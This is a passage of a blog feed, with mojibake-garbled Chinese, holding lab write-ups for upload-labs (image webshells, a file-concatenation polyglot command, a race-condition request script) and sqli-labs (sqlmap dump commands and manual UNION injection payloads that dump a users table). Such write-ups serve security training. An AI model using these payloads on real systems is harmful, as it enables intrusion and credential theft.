height=&quot;69&quot;</span><br></pre></td></tr></table></figure><p>å®ä¾‹ 2ï¼šè¿œç¨‹å›¾ç‰‡æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$remote_png_url = &#x27;http://www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png&#x27;;$img_data = getimagesize($remote_png_url);print_r($img_data );?&gt;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå®ä¾‹è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array(    [0] =&gt; 290    [1] =&gt; 69    [2] =&gt; 3    [3] =&gt; width=&quot;290&quot; height=&quot;69&quot;    [bits] =&gt; 8    [mime] =&gt; image/png)</span><br></pre></td></tr></table></figure><p>è¿”å›ç»“æœè¯´æ˜</p><ul><li>ç´¢å¼• 0 ç»™å‡ºçš„æ˜¯å›¾åƒå®½åº¦çš„åƒç´ å€¼</li><li>ç´¢å¼• 1 ç»™å‡ºçš„æ˜¯å›¾åƒé«˜åº¦çš„åƒç´ å€¼</li><li>ç´¢å¼• 2 ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»å‹ï¼Œè¿”å›çš„æ˜¯æ•°å­—ï¼Œå…¶ä¸­ 1 = GIFï¼Œ2 = JPGï¼Œ3 = PNGï¼Œ4 = SWFï¼Œ5 = PSDï¼Œ6 =  BMPï¼Œ7 = TIFF (intel byte order)ï¼Œ8 = TIFF (motorola byte order)ï¼Œ9 = JPCï¼Œ10 = JP2ï¼Œ11 = JPXï¼Œ12 = JB2ï¼Œ13 = SWCï¼Œ14 = IFFï¼Œ15 = WBMPï¼Œ16 = XBM</li><li>ç´¢å¼• 3 ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥ç”¨äº HTML çš„ <image> æ ‡ç­¾</li><li>ç´¢å¼• bits ç»™å‡ºçš„æ˜¯å›¾åƒçš„æ¯ç§é¢œè‰²çš„ä½æ•°ï¼ŒäºŒè¿›åˆ¶æ ¼å¼</li><li>ç´¢å¼• channels ç»™å‡ºçš„æ˜¯å›¾åƒçš„é€šé“å€¼ï¼ŒRGB å›¾åƒé»˜è®¤æ˜¯ 3</li><li>ç´¢å¼• mime ç»™å‡ºçš„æ˜¯å›¾åƒçš„ MIME ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯å¯ä»¥ç”¨æ¥åœ¨ HTTP Content-type å¤´ä¿¡æ¯ä¸­å‘é€æ­£ç¡®çš„ä¿¡æ¯ï¼Œå¦‚ï¼š header (â€œContent-type: image/jpegâ€);</li></ul><h1 id="pass-15"><a class="markdownIt-Anchor" href="#pass-15">#</a> Pass-15</h1><h2 id="è¿‡ç¨‹-15"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-15">#</a> è¿‡ç¨‹</h2><p>ä½¿ç”¨ exif_imagetype () æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶</p><p>ç”¨å›¾ç‰‡é©¬è¿›è¡Œç»•è¿‡</p><p><img src="upload-labs-15-01.png" alt=""></p><p>ä½†æ˜¯è¿˜å¾—å¸® php å®‰è£… exif.so æ‰©å±•åº“</p><p><img src="upload-labs-15-02.png" alt=""></p><p>ä¸Šä¼ æˆåŠŸ</p><p><img src="upload-labs-15-03.png" alt=""></p><h2 id="æ€»ç»“-15"><a class="markdownIt-Anchor" href="#æ€»ç»“-15">#</a> æ€»ç»“</h2><p>exif_imagetype ( string $filename ) : int <em>exif_imagetype()</em> è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚</p><h1 id="pass-16"><a class="markdownIt-Anchor" href="#pass-16">#</a> Pass-16</h1><h2 id="è¿‡ç¨‹-16"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-16">#</a> è¿‡ç¨‹</h2><p>çœ‹æºç ï¼Œåˆ¤æ–­äº†åç¼€ï¼Œç„¶ååˆ©ç”¨ imagecreatefrompng () ç­‰å‡½æ•°åˆ›å»ºå›¾ç‰‡ï¼ŒåŒæ—¶ä¹Ÿåˆ©ç”¨è¿™ä¸ªå‡½æ•°åˆ¤æ–­å›¾ç‰‡ç±»å‹æ˜¯å¦ä¸€è‡´äº†ï¼Œç„¶åå†é‡å‘½åæ–‡ä»¶</p><p>ä¾ç„¶ç”¨å›¾ç‰‡é©¬ç»•è¿‡ï¼Œä½†æ˜¯ç®€å•çš„åœ¨æ–‡ä»¶å‰åŠ å…¥ GIF89a å·²ç»ä¸å¯</p><p>é‚£å°±æŠŠå›¾ç‰‡å’Œæœ¨é©¬åˆåœ¨ä¸€èµ·å­ï¼Œcmd æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy pig.jpg/b +  a.php/a haha.jpg</span><br></pre></td></tr></table></figure><p>å†ä¸Šä¼  haha.jpg</p><p><img src="upload-labs-16-01.png" alt=""></p><p>å¾€ä¸‹ç¿»å¯ä»¥çœ‹åˆ°æœ¨é©¬è¢«æ’åœ¨äº†å›¾ç‰‡çš„ä¸­é—´</p><h2 id="æ€»ç»“-16"><a class="markdownIt-Anchor" href="#æ€»ç»“-16">#</a> æ€»ç»“</h2><p>è¿‡è¿‡è¿‡</p><h1 id="pass-17"><a class="markdownIt-Anchor" href="#pass-17">#</a> Pass-17</h1><h2 id="è¿‡ç¨‹-17"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-17">#</a> è¿‡ç¨‹</h2><p>çœ‹æºç ï¼Œæ˜¯å…ˆä¸Šä¼ æ–‡ä»¶ç§»åŠ¨åˆ° upload æ–‡ä»¶å¤¹åï¼Œå†å¯¹åç¼€è¿›è¡Œåˆ¤æ–­ï¼Œåˆ¤æ–­å…è®¸åé‡å‘½åæ–‡ä»¶å†åˆ é™¤åŸæ¥çš„æ–‡ä»¶ï¼Œå¦åˆ™ç›´æ¥åˆ é™¤æ–‡ä»¶</p><p>é‚£å°±ææ–‡ä»¶ç«äº‰ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶å’Œåˆ é™¤æ–‡ä»¶ä¹‹é—´çš„æ—¶é—´ï¼Œè¿›è¡Œè®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¹¶ä¸”é€šè¿‡ä¸Šä¼ çš„æ–‡ä»¶åˆ›å»ºæ–°çš„æœ¨é©¬</p><p>åˆ©ç”¨ py è„šæœ¬ä¸æ–­è®¿é—®ä¸Šä¼ çš„ haha.php</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestswhile <span class="literal">True</span>:    requests.get(<span class="string">&#x27;http://www.upload-labs.com/upload-labs/upload/haha.php&#x27;</span>)</span><br></pre></td></tr></table></figure><p><a href="http://xn--request-fy3l308svi7bxjr.py">ç„¶åè¿è¡Œ request.py</a></p><p>ç„¶åä¸æ–­ç‚¹å‡»å‘åŒ…</p><p><img src="upload-labs-17-02.png" alt=""></p><p>ä¸Šä¼ æˆåŠŸ</p><p><img src="upload-labs-17-01.png" alt=""></p><p><img src="upload-labs-17-03.png" alt=""></p><h2 id="æ€»ç»“-17"><a class="markdownIt-Anchor" href="#æ€»ç»“-17">#</a> æ€»ç»“</h2><p>æŠ„ä½œä¸šçš„æ„Ÿè§‰ï¼Œå”‰</p><h1 id="pass-18"><a class="markdownIt-Anchor" href="#pass-18">#</a> Pass-18</h1><h2 id="è¿‡ç¨‹-18"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-18">#</a> è¿‡ç¨‹</h2><p>æºä»£ç ä¸­ï¼Œå…ˆæ£€æŸ¥äº†åç¼€ï¼Œå¤§å°ç­‰ç­‰ï¼Œå†ä¸Šä¼ ï¼Œå†é‡å‘½å</p><p>å®ƒæ£€æŸ¥åç¼€ç”¨çš„ç™½åå•ï¼Œæ‰€ä»¥è¯•ä¸€ä¸‹æˆªæ–­â•ç«äº‰</p><p>æƒ³æ³•å¾ˆç¾å¥½ï¼Œç°å®å¾ˆéª¨æ„Ÿï¼Œçœ‹æŠ¥é”™ä¿¡æ¯ï¼Œæ˜¯å¡åœ¨æ–‡ä»¶ååç¼€ä¸Šäº†</p><p><img src="upload-labs-18-01.png" alt=""></p><p>æ‰€ä»¥ç›´æ¥å’Œä¹‹å‰ä¸€æ ·ä¸Šä¼ å›¾ç‰‡é©¬å“ˆå“ˆå“ˆ</p><p><img src="upload-labs-18-02.png" alt=""></p><p>å†ç”¨æ–‡ä»¶åŒ…å«ä¹‹ç±»çš„é…åˆâ€¦</p><h2 id="æ€»ç»“-18"><a class="markdownIt-Anchor" href="#æ€»ç»“-18">#</a> æ€»ç»“</h2><p>ä¸–ä¸Šæ— éš¾äº‹åªè¦è‚¯æ”¾å¼ƒ</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œä¹Ÿå¯ä»¥å°† php æ–‡ä»¶åç¼€åæ›´æ”¹ä¸º.php.7zï¼Œå› ä¸ºç™½åå•ä¸­å…è®¸ä¸Šä¼ .7z çš„æ–‡ä»¶ï¼Œä½†æ˜¯ apache åˆä¸èƒ½è§£æè¿™ä¸ªæ ¼å¼ï¼Œæ‰€ä»¥ä¼šæŠŠè¯¥æ–‡ä»¶å½“ php çš„æ ¼å¼è§£æ</p><h1 id="pass-19"><a class="markdownIt-Anchor" href="#pass-19">#</a> Pass-19</h1><h2 id="è¿‡ç¨‹-19"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-19">#</a> è¿‡ç¨‹</h2><p>å¯ä»¥è‡ªå®šä¹‰åç§°</p><p>ä¸Šä¼  a.php</p><p>è‡ªå®šä¹‰åç§° haha.php.</p><p>å› ä¸ºç”¨çš„é»‘åå•ï¼Œä¸Šä¼ æˆåŠŸ</p><p><img src="upload-labs-19-01.png" alt=""></p><p>å¤§å°å†™éƒ½èƒ½ç»•å“ˆå“ˆå“ˆ</p><h2 id="æ€»ç»“-19"><a class="markdownIt-Anchor" href="#æ€»ç»“-19">#</a> æ€»ç»“</h2><p>å“ˆå“ˆå“ˆ</p>]]></content>
      
      
      <categories>
          
          <category> å¤§å†’é™© </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼ é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labsåŸºç¡€å…³å¡</title>
      <link href="/2020/11/16/dmx/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/"/>
      <url>/2020/11/16/dmx/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="less-1"><a class="markdownIt-Anchor" href="#less-1">#</a> Less-1</h1><p>date:2020-11-16 21:29:27</p><h2 id="è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹">#</a> è¿‡ç¨‹</h2><p>æ ¹æ®é¢˜ç›®æç¤ºï¼šPlease input the ID as parameter with numeric value ï¼Œæ³¨å…¥ç‚¹ä¸º id</p><h3 id="sqlmap"><a class="markdownIt-Anchor" href="#sqlmap">#</a> sqlmapï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">çˆ†åº“:</span><br><span class="line">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 --dbs --batch</span><br><span class="line">çˆ†è¡¨ï¼š</span><br><span class="line">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security --tables --batch</span><br><span class="line">çˆ†å­—æ®µ:</span><br><span class="line">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users --columns --batch</span><br><span class="line">çˆ†å­—æ®µå€¼:</span><br><span class="line">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users -C id,password,username --dump --batch</span><br><span class="line"></span><br><span class="line">æ‹¿åˆ°æ•°æ®ï¼Œåˆ«çš„è¡¨åŒç†ï¼š</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure><h3 id="æ‰‹å·¥æ³¨å…¥"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥">#</a> æ‰‹å·¥æ³¨å…¥ï¼š</h3><p>å…ˆå°å¿ƒç¿¼ç¿¼åœ°è¯•ä¸€ä¸ª id=1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=1</span><br></pre></td></tr></table></figure><p>å“¦è±ï¼Œæœ‰æ•°æ®å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure><p>ç”¨ orderby è¯•ä¸€ä¸‹è¦å‡ ä¸ªå­—æ®µï¼Œä½†æ˜¯å‘ç°éšä¾¿ oderby éƒ½æ˜¯ä¸€æ ·çš„å›æ˜¾â€¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=2 order by 110</span><br></pre></td></tr></table></figure><p>ä¸­é—´è¯•äº†å¥½å¤šéƒ½æ²¡æœ‰ç»™å›åº”ï¼ŒåŠ å•å¼•å·æŠ¥é”™çœ‹ä¸€ä¸‹ sql è¯­å¥ï¼Œå…ˆå…¥ä¸ºä¸»ä»¥ä¸ºæ˜¯æ•°å­—å‹çš„äº†ï¼Œæ˜æ˜é¢˜ç›®ä¹Ÿå†™äº†â€¦ è ¢çˆ†äº†ï¼ï¼ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=1&#x27;</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>orderby è¯•å‡ºæ¥æ˜¯è¦ä¸‰ä¸ªå­—æ®µï¼Œå› ä¸ºè¦é—­åˆåé¢çš„å•å¼•å·å¥½éº»çƒ¦å°±ç›´æ¥ç”¨ #ï¼ˆURL ç¼–ç  %23ï¼‰æ³¨é‡Šäº†åé¢çš„ä»£ç ï¼Œè‡ªå·±æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=1&#x27; order by 3 limit 1 %23</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br><span class="line"></span><br><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=1&#x27; order by 4 limit 1 %23</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure><p>ä¸‰ä¸ªå­—æ®µï¼Œåªè¾“å‡ºäº†ä¸¤ä¸ªå€¼ï¼Œç†æ‰€å½“ç„¶æœ‰ä¸€ä¸ª id å•¦ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªå­—æ®µéšä¾¿æï¼Œåé¢ä¸¤ä¸ªå­—æ®µç”¨äº†è¾“å‡ºæˆ‘ä»¬è¦çš„æ•°æ®ï¼Œä¸€å¥—æµç¨‹èµ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">çˆ†åº“ï¼Œä»mysqlé»˜è®¤çš„æ•°æ®åº“information_schemaé‡Œæ‰¾æ‰€æœ‰çš„æ•°æ®ï¼Œä½¿ç”¨group_concatæ‹¼æ¥ï¼š</span><br><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=666666&#x27; union select 1,database(),group_concat(schema_name) from information_schema.schemata %23</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">ç¬¬äºŒä¸ªå­—æ®µæ˜¯å½“å‰æ•°æ®åº“securityï¼Œç¬¬ä¸‰ä¸ªå­—æ®µæ˜¯è¾“å‡ºlocalhostæ‰€æœ‰çš„æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">çˆ†è¡¨ï¼š</span><br><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=666666&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema %23</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br><span class="line"></span><br><span class="line">çˆ†å­—æ®µï¼š</span><br><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=666666&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; %23</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">Your Login name:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</span><br><span class="line">Your Password:3</span><br><span class="line"></span><br><span class="line">çˆ†å­—æ®µå€¼ï¼š</span><br><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=666666&#x27; union select 1,group_concat(concat_ws(&#x27;--&#x27;,id,username,password)),3 from users+%23</span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">Your Login name:1--Dumb--Dumb,2--Angelina--I-kill-you,3--Dummy--p@ssword,4--secure--crappy,5--stupid--stupidity,6--superman--genious,7--batman--mob!le,8--admin--admin,9--admin1--admin1,10--admin2--admin2,11--admin3--admin3,12--dhakkan--dumbo,14--admin4--admin4</span><br><span class="line">Your Password:3</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“">#</a> æ€»ç»“</h2><ol><li>è™½ç„¶æˆ‘è§‰å¾—é—­åˆå¼•å·å¾ˆéº»çƒ¦ï¼Œä½†æ˜¯æˆ‘å°±æ˜¯è¿˜æ˜¯æƒ³å»è¯•ä¸€ä¸‹ï¼Œç›´æ¥åœ¨æœ€åé—­åˆå°±å¯ä»¥äº†ï¼Œä¹Ÿä¸ä¼šæŠ¥è¯­æ³•é”™</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=1&quot; order by 3 &quot;</span><br></pre></td></tr></table></figure><p>â€‹é‚£ä¸ºä»€ä¹ˆå¤§å®¶é—­åˆçš„æ—¶å€™éƒ½å–œæ¬¢ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><ol start="2"><li><p>ç”»é¢æ„Ÿåœ°ç†è§£ä¸€ä¸‹å‡½æ•°</p><p>concat_ws () æ˜¯æ‹¼æ¥ä¸€è¡Œçš„æ•°æ®</p><p>group_concat () æ˜¯æ‹¼æ¥ä¸€åˆ—çš„æ•°æ®</p></li><li><p>å› ä¸º sql å­¦çš„å°±å¾ˆèœï¼Œæœ‰äº›è¯­æ³•å‡½æ•°ä»€ä¹ˆçš„è¿˜è¦ç™¾åº¦ï¼Œmysql é‡Œ information_schema é‡Œçš„ï¼Œå¾ˆå¤šè¡¨åå’Œå­—æ®µåç»å¸¸ææ··ï¼Œæ‰‹å·¥æ³¨å…¥çš„æ—¶å€™è¿˜è¦å»çœ‹å…·ä½“çš„è¡¨åå’Œå­—æ®µåï¼Œè¶…çº§æµªè´¹æ—¶é—´çš„ï¼Œå¯æ˜¯è®°ä¸€ä¸‹å§å¾ˆä¹…ä¸å†™åˆå¿˜è®°äº†ï¼Œè€Œä¸”æ•°æ®åº“é‚£ä¹ˆå¤šï¼Œé»˜è®¤çš„è¡¨éƒ½ä¸ä¸€æ ·ï¼Œè¿˜æ˜¯å¤šå†™é¢˜ 8</p></li><li><p>è·‘ sqlmap çš„æ—¶å€™ï¼Œä¼šç»™å‡ºç›¸åº”çš„ payloadï¼Œæœ‰äº›å†™å¾—çœŸçš„è¶…çº§å¤æ‚ï¼Œè¯´æ˜¯ä¸ºäº†ç»•è¿‡æŠŠï¼Œå¯æ˜¯æœ‰ä¸ª select å°±æ„Ÿè§‰ç»•ä¸è¿‡å»å‘€ï¼Œç­‰æœ‰ä¸€å¤©æˆ‘ä¸å†æ˜¯ä¸€ä¸ªè¿è„šæœ¬éƒ½ä¸ä¼šç”¨çš„èœé¸¡äº†ï¼Œæœ‰æœºä¼šçš„è¯ï¼Œæƒ³å»ç ”è¯»ä¸€ä¸‹æºç </p></li></ol><hr><h1 id="less-2"><a class="markdownIt-Anchor" href="#less-2">#</a> Less-2</h1><p>data: 2020-11-17 10:32:43</p><h2 id="è¿‡ç¨‹-2"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-2">#</a> è¿‡ç¨‹</h2><p>å’Œ less-1 ç›¸æ¯”å°±æ˜¯å°‘é—­åˆäº†ä¸¤ä¸ªå¼•å·ç½¢äº†</p><h3 id="sqlmap-2"><a class="markdownIt-Anchor" href="#sqlmap-2">#</a> sqlmap</h3><p>åŒ Less-1</p><h3 id="æ‰‹å·¥æ³¨å…¥-2"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-2">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>åˆ¤æ–­ id æ˜¯æ³¨å…¥ç‚¹ä¸”éœ€è¦ä¸‰ä¸ªå­—æ®µï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http://www.sqli-labs.com/Less-2?id=1 order by 4è¾“å‡ºï¼šUnknown column &#x27;4&#x27; in &#x27;order clause&#x27;payload:http://www.sqli-labs.com/Less-2?id=1 order by 3è¾“å‡ºï¼šYour Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure><p>å’Œ less-1 ä¸€æ ·ä¸€å¥—æµç¨‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çˆ†åº“ï¼Œç¬¬äºŒä¸ªå­—æ®µæ‹¼æ¥æ”¹è¿æ¥æ‰€æœ‰æ•°æ®åº“åï¼šhttp://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemataçˆ†å½“å‰æ•°æ®åº“çš„è¡¨ï¼šhttp://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schemaçˆ†å­—æ®µï¼šhttp://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;çˆ†å­—æ®µå€¼ï¼šhttp://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“-2"><a class="markdownIt-Anchor" href="#æ€»ç»“-2">#</a> æ€»ç»“</h2><p>æƒ³å½“å¹´æˆ‘è¿˜æ˜¯ä¸ªä¸ç®¡å†™ä»€ä¹ˆé¢˜ç›®éƒ½è¦çœ‹é€šå…³æ‰‹å†Œçš„äººï¼Œé¼“æŒï¼ï¼ï¼</p><hr><h1 id="less-3"><a class="markdownIt-Anchor" href="#less-3">#</a> Less-3</h1><p>date:2020-11-17 11:00:04</p><h2 id="è¿‡ç¨‹-3"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-3">#</a> è¿‡ç¨‹</h2><h3 id="sqlmap-3"><a class="markdownIt-Anchor" href="#sqlmap-3">#</a> sqlmap</h3><p>åŒ Less-1</p><h3 id="æ‰‹å·¥æ³¨å…¥-3"><a class="markdownIt-Anchor" href="#æ‰‹å·¥æ³¨å…¥-3">#</a> æ‰‹å·¥æ³¨å…¥</h3><p>åŠ å•å¼•å·æŠ¥é”™ï¼Œçœ‹åé¢å…·ä½“è¦é—­åˆå•¥</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-3?id=1asdf&#x27;kkkk</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼Œå‘ç°åé¢æœ‰æ‹¬å·å•¥çš„é—­åˆä¸€ä¸‹ï¼Œå¹¶ä¸” id ä¹Ÿæ˜¯å­—ç¬¦å‹çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;kkkk&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>æ ¹æ® order by åˆ¤æ–­éœ€è¦çš„å­—æ®µæ•°æ˜¯ 3 ä¸ª</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 4 --+http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 3 --+</span><br></pre></td></tr></table></figure><p>è„±è„±è„±ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çˆ†åº“ï¼Œç¬¬äºŒä¸ªå­—æ®µæ‹¼æ¥æ”¹è¿æ¥æ‰€æœ‰æ•°æ®åº“åï¼šhttp://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+çˆ†å½“å‰æ•°æ®åº“çš„è¡¨ï¼šhttp://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+çˆ†å­—æ®µï¼šhttp://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+çˆ†å­—æ®µå€¼ï¼šhttp://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“-3"><a class="markdownIt-Anchor" href="#æ€»ç»“-3">#</a> æ€»ç»“</h2><p>?id=1&quot; ç«Ÿç„¶æ­£å¸¸è¿”å›ä¿¡æ¯äº†ï¼ï¼ï¼</p><p>å› ä¸º id=xx (â€˜1&quot;â€™) 